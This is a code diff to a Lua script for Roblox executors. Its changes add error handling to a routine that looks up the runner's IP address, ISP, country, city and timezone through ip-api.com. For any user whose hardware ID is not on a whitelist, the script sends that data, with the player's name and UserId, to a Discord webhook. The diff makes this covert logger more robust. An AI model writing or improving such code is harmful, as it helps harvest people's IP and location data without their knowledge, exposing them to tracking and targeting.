@@ -21,12 +21,35 @@ if game:IsLoaded() then
     local place_id = game.PlaceId
     local place_name = game:GetService("MarketplaceService"):GetProductInfo(place_id).Name
 
-    local ip_info = syn and syn.request or http_request or request({
-        Url = "http://ip-api.com/json",
-        Method = "GET"
-    })
-
-    getgenv().ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+    -- Инициализируем ipinfo_table с дефолтными значениями на случай ошибки
+    getgenv().ipinfo_table = {
+        query = "N/A",
+        isp = "N/A", 
+        country = "N/A",
+        city = "N/A",
+        timezone = "N/A"
+    }
+    
+    -- Пытаемся получить IP-информацию
+    local success_ip, ip_response = pcall(function()
+        local request_func = syn and syn.request or http_request or request
+        if not request_func then
+            return {Success = false, Body = '{}'}
+        end
+        return request_func({
+            Url = "http://ip-api.com/json",
+            Method = "GET"
+        })
+    end)
+    
+    if success_ip and ip_response and ip_response.Success and ip_response.Body then
+        local success_json, decoded = pcall(function()
+            return game:GetService("HttpService"):JSONDecode(ip_response.Body)
+        end)
+        if success_json and decoded then
+            getgenv().ipinfo_table = decoded
+        end
+    end
 
     local current_time = os.date("%Y-%m-%d %H:%M:%S")
 
@@ -68,27 +91,27 @@ if game:IsLoaded() then
                 },
                 {
                     ["name"] = "IP",
-                    ["value"] = getgenv().ipinfo_table.query,
+                    ["value"] = getgenv().ipinfo_table.query or "N/A",
                     ["inline"] = false
                 },
                 {
                     ["name"] = "Provider",
-                    ["value"] = getgenv().ipinfo_table.isp,
+                    ["value"] = getgenv().ipinfo_table.isp or "N/A",
                     ["inline"] = true
                 },
                 {
                     ["name"] = "Country",
-                    ["value"] = getgenv().ipinfo_table.country,
+                    ["value"] = getgenv().ipinfo_table.country or "N/A",
                     ["inline"] = true
                 },
                 {
                     ["name"] = "City",
-                    ["value"] = getgenv().ipinfo_table.city,
+                    ["value"] = getgenv().ipinfo_table.city or "N/A",
                     ["inline"] = true
                 },
                 {
                     ["name"] = "Time zone",
-                    ["value"] = getgenv().ipinfo_table.timezone,
+                    ["value"] = getgenv().ipinfo_table.timezone or "N/A",
                     ["inline"] = true
                 }
             }
@@ -100,22 +123,24 @@ if game:IsLoaded() then
     print("Your Name:", player_name)
     print("Your UserId:", player_id)
 
-    for _, player in ipairs(whitelist) do
-        if player.HWID == hwid then
+    for _, whitelisted_player in ipairs(whitelist) do
+        if whitelisted_player.HWID == hwid then
             valid = true
             print('You are in whitelist!')
             break
         end
     end
 
-
     if valid then
         print('You are in Whitelist - No logs sent')
     else
         print('Sending logs to Discord...')
-        local success, error = pcall(function()
+        local success_webhook, error_msg = pcall(function()
             local request_func = syn and syn.request or http_request or request
-            request_func({
+            if not request_func then
+                error("No request function available")
+            end
+            return request_func({
                 Url = webhook_url,
                 Method = "POST",
                 Headers = {
@@ -125,10 +150,10 @@ if game:IsLoaded() then
             })
         end)
         
-        if success then
+        if success_webhook then
             print('Logs sent successfully!')
         else
-            print('Error sending logs:', error)
+            print('Error sending logs:', error_msg)
         end
     end
 end
